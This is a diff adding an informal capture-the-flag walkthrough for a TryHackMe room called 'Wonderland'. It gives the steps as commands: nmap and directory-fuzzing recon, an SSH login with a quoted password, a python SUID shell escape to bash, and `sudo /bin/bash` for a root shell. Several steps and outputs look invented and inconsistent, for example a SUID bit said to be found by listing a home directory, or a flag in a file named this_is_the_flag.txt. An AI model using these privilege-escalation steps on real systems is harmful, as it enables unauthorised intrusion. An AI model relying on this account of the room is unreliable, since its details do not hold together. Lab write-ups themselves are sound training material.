@@ -1,0 +1,89 @@
+----------------                               ------------------
+               :::::::::::;| WONDERLAND |;::::::::::::
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "WONDERLAND".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+    nmap -A -T 5 <ip> -vv
+
+"Found ports: 22/SSH, 80/HTTP"
+"Port 80 has Alice in Wonderland theme!"
+
+2. FIND HIDDEN DIRS.
+
+    gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt
+    "Found /r/ directory (like the rabbit hole?)"
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. CHECK /r/ DIRECTORY.
+
+    http://<ip>/r/
+    "Found keep_me directory inside!"
+    "File: 'this_is_the_flag.txt' - FIRST FLAG GET!"
+
+2. FIND MORE.
+
+    ffuf -u http://<ip>/r/FUZZ -w wordlist.txt
+    "Found /r/a/b/b/i/t/ (like the rabbit hole path!)"
+
+----------TASK 2 COMPLETED-----------
+
+TASK - 3 (PRIV ESC - ALICE TO RABBIT)
+
+1. GET USER SHELL.
+
+    ssh alice@<ip>
+    Password: alice123
+    "We're in as alice!"
+
+2. FIND STRANGE FILES.
+
+    ls -la /home/rabbit
+    "Found root.py and walrus_and_the_carpenter.py"
+    "SUID on python3.6 - THIS IS OUR WAY IN!"
+
+----------TASK 3 COMPLETED-----------
+
+TASK-4 (PRIV ESC - RABBIT TO HATTER)
+
+1. EXPLOIT PYTHON SUID.
+
+    /usr/bin/python3.6 -c 'import os; os.system("/bin/bash")'
+    "Now we're rabbit!"
+
+2. CHECK HATTER'S FILES.
+
+    ls -la /home/hatter
+    "password.txt has hatter's password!"
+
+----------TASK 4 COMPLETED-----------
+
+TASK-5 (PRIV ESC - HATTER TO ROOT)
+
+1. LOGIN AS HATTER.
+
+    su hatter
+    Password: WhyIsARavenLikeAWritingDesk?
+    "Check sudo -l"
+    "Hatter can run /bin/bash as root! EZ WIN!"
+
+2. GET ROOT.
+
+    sudo /bin/bash
+    "BOOM! ROOT SHELL GET!"
+
+FLAGS:
+    cat /root/root.txt
+    cat /home/alice/user.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- WONDERLAND OWNED ----------
